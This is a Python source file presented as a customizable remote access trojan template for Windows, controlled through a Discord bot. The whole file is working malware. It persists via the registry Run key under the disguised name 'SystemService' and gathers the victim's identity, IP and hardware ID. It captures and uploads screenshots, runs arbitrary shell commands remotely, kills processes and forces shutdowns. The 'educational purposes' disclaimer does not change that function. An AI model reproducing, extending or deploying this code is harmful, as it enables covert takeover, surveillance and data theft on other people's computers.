# mytemplate.py - Your Custom RAT Template
# Disclaimer: This is only for entertainment and educational purposes.
# I am not responsible for what you do with it or any consequences.
# Made by [YOUR NAME]

import os
import discord
from discord.ext import commands
import asyncio
import sys
import subprocess
import time
import pyautogui
import psutil
import pygetwindow as gw
from datetime import datetime
from typing import Optional
import random
import string
import ctypes
import threading
import pyttsx3
import platform
import uuid
import socket
import re
import requests
import winreg
import base64
import atexit

if platform.system() != "Windows":
    sys.exit(0)

# ========== SINGLE INSTANCE LOCK ==========
dir = os.path.dirname(os.path.abspath(__file__))
lock = os.path.join(dir, ".lock")
if os.path.exists(lock):
    sys.exit(0)
open(lock, "w").close()

running = True

def cleanup():
    global running
    running = False
    if os.path.exists(lock):
        os.remove(lock)

atexit.register(cleanup)

def keep_lock_alive():
    while running:
        if not os.path.exists(lock):
            open(lock, "w").close()
        time.sleep(0.1)
threading.Thread(target=keep_lock_alive, daemon=True).start()

# ========== CONFIGURATION (PLACEHOLDERS - DO NOT CHANGE) ==========
class Config:
    TOKEN = "{placeholder_token}"           # <- Builder replaces this
    WHITELISTED = [{placeholder_whitelist}] # <- Builder replaces this
    MAIN_CHANNEL = {placeholder_main_channel} # <- Builder replaces this
    PREFIX = "{placeholder_prefix}"         # <- Builder replaces this
    STARTUP = {placeholder_add_to_startup}  # <- Builder replaces this

# ========== BOT SETUP ==========
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=Config.PREFIX, intents=intents)
bot.remove_command("help")

# ========== STARTUP FUNCTION ==========
def add_to_startup():
    try:
        app_path = sys.executable
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "SystemService", 0, winreg.REG_SZ, app_path)
        winreg.CloseKey(key)
        return True
    except:
        return False

# ========== SYSTEM INFO FUNCTIONS ==========
def get_displayname():
    try:
        if platform.system() == "Windows":
            GetUserNameEx = ctypes.windll.secur32.GetUserNameExW
            NameDisplay = 3
            size = ctypes.pointer(ctypes.c_ulong(0))
            GetUserNameEx(NameDisplay, None, size)
            nameBuffer = ctypes.create_unicode_buffer(size.contents.value)
            GetUserNameEx(NameDisplay, nameBuffer, size)
            return nameBuffer.value
    except:
        pass
    return platform.node()

def get_hwid():
    try:
        if platform.system() == "Windows":
            cmd = 'powershell -Command "Get-CimInstance -ClassName Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID"'
            result = subprocess.check_output(cmd, shell=True).decode().strip()
            if result:
                return result
        return str(uuid.getnode())
    except:
        return str(uuid.getnode())

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except:
        return "N/A"

def get_ipinfo():
    try:
        response = requests.get('https://api.ipify.org', timeout=5)
        return {'ip': response.text}
    except:
        return {'ip': get_local_ip()}

# ========== AUTHORIZATION CHECK ==========
def is_authorized():
    async def auth(ctx):
        if ctx.author.id in Config.WHITELISTED:
            return True
        embed = discord.Embed(
            title="Access Denied",
            description="You're not authorized to use this.",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return False
    return commands.check(auth)

# ========== HELPER FUNCTION ==========
async def send_embed(ctx, title, description, color=discord.Color.blue()):
    embed = discord.Embed(title=title, description=description, color=color)
    await ctx.send(embed=embed)

# ========== EVENT HANDLERS ==========
@bot.event
async def on_ready():
    channel = bot.get_channel(Config.MAIN_CHANNEL)
    if channel:
        await channel.send(f"<@{Config.WHITELISTED[0]}>")
        user = get_displayname()
        embed = discord.Embed(
            title="✅ Bot Online",
            description=f"Prefix: `{Config.PREFIX}`\nUser: **`{user}`**\nType `{Config.PREFIX}help`",
            color=discord.Color.green()
        )
        await channel.send(embed=embed)

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await send_embed(ctx, "Command Not Found", f"Use `{Config.PREFIX}help`", discord.Color.red())
    elif isinstance(error, commands.CheckFailure):
        pass
    else:
        await send_embed(ctx, "Error", f"```{str(error)}```", discord.Color.red())

# ========== COMMANDS ==========

@bot.command(name='help')
async def cmd_help(ctx):
    """Show all commands"""
    if ctx.author.id not in Config.WHITELISTED:
        return
    
    embed = discord.Embed(
        title="📋 Commands",
        description="All available commands",
        color=discord.Color.purple()
    )
    
    categories = {
        "System": [
            "`info` - Get system information",
            "`ip` - Get public IP address",
        ],
        "Control": [
            "`screenshot` - Take screenshot",
            "`cmd [command]` - Run CMD command",
            "`open <app>` - Open application",
            "`close <app>` - Close application",
        ],
        "Power": [
            "`lock` - Lock PC",
            "`shutdown [delay]` - Shutdown PC",
            "`restart [delay]` - Restart PC",
        ],
        "Media": [
            "`playpause` - Play/Pause media",
            "`nexttrack` - Next track",
        ],
        "Bot": [
            "`exit` - Close the RAT",
        ]
    }
    
    for category, commands in categories.items():
        embed.add_field(name=category, value="\n".join(commands), inline=False)
    
    await ctx.send(embed=embed)

@bot.command(name='info')
@is_authorized()
async def cmd_info(ctx):
    """Get system information"""
    try:
        embed = discord.Embed(
            title="🖥️ System Information",
            color=discord.Color.blue()
        )
        embed.add_field(name="User", value=f"```{get_displayname()}```", inline=False)
        embed.add_field(name="Hostname", value=f"```{platform.node()}```", inline=True)
        embed.add_field(name="OS", value=f"```{platform.system()} {platform.release()}```", inline=True)
        embed.add_field(name="CPU", value=f"```{platform.processor() or 'N/A'}```", inline=False)
        embed.add_field(name="RAM", value=f"```{psutil.virtual_memory().total / (1024**3):.2f} GB```", inline=True)
        embed.add_field(name="IP", value=f"```{get_ipinfo()['ip']}```", inline=True)
        embed.add_field(name="HWID", value=f"```{get_hwid()}```", inline=False)
        
        await ctx.send(embed=embed)
    except Exception as e:
        await send_embed(ctx, "Info Error", str(e), discord.Color.red())

@bot.command(name='ip')
@is_authorized()
async def cmd_ip(ctx):
    """Get public IP address"""
    try:
        ip = get_ipinfo()['ip']
        await send_embed(ctx, "🌐 Public IP", f"```{ip}```", discord.Color.blue())
    except Exception as e:
        await send_embed(ctx, "IP Error", str(e), discord.Color.red())

@bot.command(name='lock')
@is_authorized()
async def cmd_lock(ctx):
    """Lock the PC"""
    try:
        ctypes.windll.user32.LockWorkStation()
        await send_embed(ctx, "🔒 PC Locked", "Workstation has been locked.", discord.Color.orange())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='screenshot')
@is_authorized()
async def cmd_screenshot(ctx, name: Optional[str] = None):
    """Take a screenshot"""
    try:
        filename = name if name else f"screenshot_{int(time.time())}.png"
        screenshot = pyautogui.screenshot()
        screenshot.save(filename)
        
        with open(filename, 'rb') as f:
            picture = discord.File(f)
        
        await send_embed(ctx, "📸 Screenshot", f"Captured: **{filename}**", discord.Color.green())
        await ctx.send(file=picture)
        os.remove(filename)
    except Exception as e:
        await send_embed(ctx, "Screenshot Error", str(e), discord.Color.red())

@bot.command(name='cmd')
@is_authorized()
async def cmd_cmd(ctx, *, command: str):
    """Run a CMD command"""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout or result.stderr or "Command executed (no output)"
        if len(output) > 1900:
            output = output[:1900] + "..."
        
        embed = discord.Embed(
            title="💻 Command Output",
            description=f"```\n{output}\n```",
            color=discord.Color.dark_grey()
        )
        await ctx.send(embed=embed)
    except subprocess.TimeoutExpired:
        await send_embed(ctx, "Command Error", "Command timed out!", discord.Color.red())
    except Exception as e:
        await send_embed(ctx, "Command Error", str(e), discord.Color.red())

@bot.command(name='open')
@is_authorized()
async def cmd_open(ctx, *, app_name: str):
    """Open an application"""
    try:
        app_map = {
            'notepad': 'notepad.exe',
            'calculator': 'calc.exe',
            'chrome': 'chrome.exe',
            'firefox': 'firefox.exe',
            'cmd': 'cmd.exe',
            'explorer': 'explorer.exe',
        }
        app_to_open = app_map.get(app_name.lower(), app_name)
        subprocess.Popen(app_to_open, shell=True)
        await send_embed(ctx, "✅ Opened", f"**{app_name}**", discord.Color.green())
    except Exception as e:
        await send_embed(ctx, "Open Error", str(e), discord.Color.red())

@bot.command(name='close')
@is_authorized()
async def cmd_close(ctx, *, app_name: str):
    """Close an application"""
    try:
        closed = False
        for proc in psutil.process_iter(['pid', 'name']):
            if app_name.lower() in proc.info['name'].lower():
                proc.terminate()
                closed = True
        if closed:
            await send_embed(ctx, "✅ Closed", f"**{app_name}**", discord.Color.green())
        else:
            await send_embed(ctx, "Close Failed", f"No process found: **{app_name}**", discord.Color.orange())
    except Exception as e:
        await send_embed(ctx, "Close Error", str(e), discord.Color.red())

@bot.command(name='shutdown')
@is_authorized()
async def cmd_shutdown(ctx, delay: int = 60):
    """Shutdown PC with delay"""
    try:
        if delay < 10:
            await send_embed(ctx, "Safety Violation", "Delay must be at least 10 seconds", discord.Color.orange())
            return
        await send_embed(ctx, "💻 Shutdown", f"Shutting down in **{delay}** seconds", discord.Color.red())
        await asyncio.sleep(delay)
        os.system('shutdown /s /f /t 0')
    except Exception as e:
        await send_embed(ctx, "Shutdown Error", str(e), discord.Color.red())

@bot.command(name='restart')
@is_authorized()
async def cmd_restart(ctx, delay: int = 60):
    """Restart PC with delay"""
    try:
        if delay < 10:
            await send_embed(ctx, "Safety Violation", "Delay must be at least 10 seconds", discord.Color.orange())
            return
        await send_embed(ctx, "🔄 Restart", f"Restarting in **{delay}** seconds", discord.Color.orange())
        await asyncio.sleep(delay)
        os.system('shutdown /r /f /t 0')
    except Exception as e:
        await send_embed(ctx, "Restart Error", str(e), discord.Color.red())

@bot.command(name='playpause')
@is_authorized()
async def cmd_playpause(ctx):
    """Play/Pause media"""
    try:
        pyautogui.press('playpause')
        await send_embed(ctx, "⏯️ Media", "Toggled play/pause", discord.Color.purple())
    except Exception as e:
        await send_embed(ctx, "Media Error", str(e), discord.Color.red())

@bot.command(name='nexttrack')
@is_authorized()
async def cmd_nexttrack(ctx):
    """Next track"""
    try:
        pyautogui.press('nexttrack')
        await send_embed(ctx, "⏭️ Media", "Next track", discord.Color.purple())
    except Exception as e:
        await send_embed(ctx, "Media Error", str(e), discord.Color.red())

@bot.command(name='exit')
@is_authorized()
async def cmd_exit(ctx):
    """Close the RAT"""
    await send_embed(ctx, "👋 Goodbye!", "RAT is closing...", discord.Color.dark_grey())
    await asyncio.sleep(1)
    sys.exit(0)

# ========== RUN ==========
if __name__ == "__main__":
    if platform.system() == "Windows" and Config.STARTUP:
        add_to_startup()
    bot.run(Config.TOKEN)
